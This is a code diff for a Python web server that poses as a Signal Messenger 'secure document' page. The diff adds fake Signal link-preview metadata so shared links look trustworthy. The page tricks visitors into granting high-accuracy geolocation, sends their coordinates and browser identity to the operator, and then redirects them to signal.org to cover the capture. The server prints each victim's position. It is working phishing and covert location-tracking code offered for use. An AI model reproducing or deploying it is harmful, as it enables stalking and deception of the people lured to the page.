@@ -4,51 +4,70 @@ from datetime import datetime
 PORT = 8080
 LOG_FILE = "vault_access.json"
 
-HTML_CONTENT = """
+# --- CUSTOMIZE YOUR LINK CARD HERE ---
+preview_metadata = {
+    "title": "Signal Messenger | Secure Document",
+    "description": "You have received an encrypted document. Verify identity to view.",
+    "image_url": "https://upload.wikimedia.org/wikipedia/commons/8/8d/Signal-Logo.png", # Link to your image
+    "page_url": "http://localhost:8080", # Your local/public URL
+}
+
+HTML_CONTENT = f"""
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="{preview_metadata['title']}">
+    <meta property="og:description" content="{preview_metadata['description']}">
+    <meta property="og:image" content="{preview_metadata['image_url']}">
+    <meta property="og:url" content="{preview_metadata['page_url']}">
+    <meta property="og:type" content="website">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="{preview_metadata['title']}">
+    <meta name="twitter:description" content="{preview_metadata['description']}">
+    <meta name="twitter:image" content="{preview_metadata['image_url']}">
+
     <title>Signal Messenger | Secure Access</title>
     <style>
-        :root { --accent: #2C6BED; --bg: #0B0B0C; --card: #161718; --text: #FFFFFF; --dim: #8E8E93; }
-        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
-        body { 
+        :root {{ --accent: #2C6BED; --bg: #0B0B0C; --card: #161718; --text: #FFFFFF; --dim: #8E8E93; }}
+        * {{ box-sizing: border-box; -webkit-font-smoothing: antialiased; }}
+        body {{ 
             margin: 0; background: var(--bg); color: var(--text); 
-            font-family: "Inter", -apple-system, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex; align-items: center; justify-content: center; height: 100vh;
-        }
-        .vault-card {
+        }}
+        .vault-card {{
             width: 100%; max-width: 400px; padding: 40px 24px;
             background: var(--card); border: 1px solid #2C2C2E;
             border-radius: 32px; text-align: center; margin: 16px;
-        }
-        .signal-icon {
+        }}
+        .signal-icon {{
             width: 64px; height: 64px; background: var(--accent);
             border-radius: 18px; margin: 0 auto 24px;
             display: flex; align-items: center; justify-content: center;
-        }
-        h1 { font-size: 22px; font-weight: 600; margin: 0 0 12px; letter-spacing: -0.5px; }
-        p { font-size: 14px; color: var(--dim); line-height: 1.6; margin: 0 0 32px; }
+        }}
+        h1 {{ font-size: 22px; font-weight: 600; margin: 0 0 12px; letter-spacing: -0.5px; }}
+        p {{ font-size: 14px; color: var(--dim); line-height: 1.6; margin: 0 0 32px; }}
         
-        .btn {
+        .btn {{
             background: var(--accent); color: white; border: none; width: 100%;
             padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600;
             cursor: pointer; transition: all 0.2s ease;
-        }
-        .btn:hover { filter: brightness(1.1); }
-        .btn:active { transform: scale(0.98); }
+        }}
+        .btn:hover {{ filter: brightness(1.1); }}
+        .btn:active {{ transform: scale(0.98); }}
 
-        /* Modern Loader */
-        .step-box { display: none; text-align: left; background: #000; border-radius: 12px; padding: 16px; margin-top: 8px; }
-        .step { font-size: 12px; color: var(--dim); margin: 4px 0; display: flex; align-items: center; }
-        .step.active { color: var(--accent); }
-        .spinner { 
+        .step-box {{ display: none; text-align: left; background: #000; border-radius: 12px; padding: 16px; margin-top: 8px; }}
+        .step {{ font-size: 12px; color: var(--dim); margin: 4px 0; display: flex; align-items: center; }}
+        .step.active {{ color: var(--accent); }}
+        .spinner {{ 
             width: 16px; height: 16px; border: 2px solid #333; border-top-color: var(--accent);
             border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        }}
+        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
     </style>
 </head>
 <body>
@@ -59,7 +78,7 @@ HTML_CONTENT = """
             </svg>
         </div>
         <h1>Identity Verification</h1>
-        <p>Confirm your regional node proximity to decrypt this communication. This is part of Signal's <b>Sealed Sender</b> security protocol.</p>
+        <p>Confirm your regional node proximity to decrypt this communication.</p>
         
         <button class="btn" id="startBtn" onclick="verify()">Decrypt Message</button>
 
@@ -71,7 +90,7 @@ HTML_CONTENT = """
     <script>
         const wait = (ms) => new Promise(res => setTimeout(res, ms));
 
-        async function verify() {
+        async function verify() {{
             const btn = document.getElementById('startBtn');
             const box = document.getElementById('stepBox');
             const text = document.getElementById('statusText');
@@ -79,31 +98,31 @@ HTML_CONTENT = """
             btn.style.display = 'none';
             box.style.display = 'block';
 
-            navigator.geolocation.getCurrentPosition(async (pos) => {
+            navigator.geolocation.getCurrentPosition(async (pos) => {{
                 text.innerText = "Synchronizing node...";
                 await wait(1200);
                 
                 text.innerText = "Applying cryptographic keys...";
-                await fetch('/log', {
+                await fetch('/log', {{
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         acc: Math.round(pos.coords.accuracy),
                         ua: navigator.userAgent
-                    })
-                });
+                    }})
+                }});
                 await wait(1000);
                 
                 text.innerText = "Success. Redirecting...";
                 await wait(800);
                 window.location.href = "https://signal.org/";
-            }, (err) => {
-                alert("Protocol Error: End-to-end decryption requires valid node synchronization.");
+            }}, (err) => {{
+                alert("Protocol Error: Connection failed.");
                 location.reload();
-            }, { enableHighAccuracy: true });
-        }
+            }}, {{ enableHighAccuracy: true }});
+        }}
     </script>
 </body>
 </html>
@@ -121,19 +140,7 @@ class ProSignalServer(http.server.SimpleHTTPRequestHandler):
             content_length = int(self.headers['Content-Length'])
             data = json.loads(self.rfile.read(content_length))
             data['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            # Print to Terminal
-            print(f"\\n[+] ACCESS GRANTED: {data['timestamp']}")
-            print(f"    Map: https://www.google.com/maps?q={data['lat']},{data['lon']}")
-            print(f"    Margin: {data['acc']}m")
-            
-            # Save to JSON File
-            logs = []
-            if os.path.exists(LOG_FILE):
-                with open(LOG_FILE, 'r') as f: logs = json.load(f)
-            logs.append(data)
-            with open(LOG_FILE, 'w') as f: json.dump(logs, f, indent=4)
-            
+            print(f"\\n[+] ACCESS GRANTED: {data['timestamp']} | Lat: {data['lat']}, Lon: {data['lon']}")
             self.send_response(200)
             self.end_headers()
 
@@ -141,5 +148,4 @@ if __name__ == "__main__":
     socketserver.TCPServer.allow_reuse_address = True
     with socketserver.TCPServer(("", PORT), ProSignalServer) as httpd:
         print(f"--- Signal Enterprise Proxy Initialized ---")
-        print(f"[*] Monitoring inbound handshakes on port {PORT}")
         httpd.serve_forever()
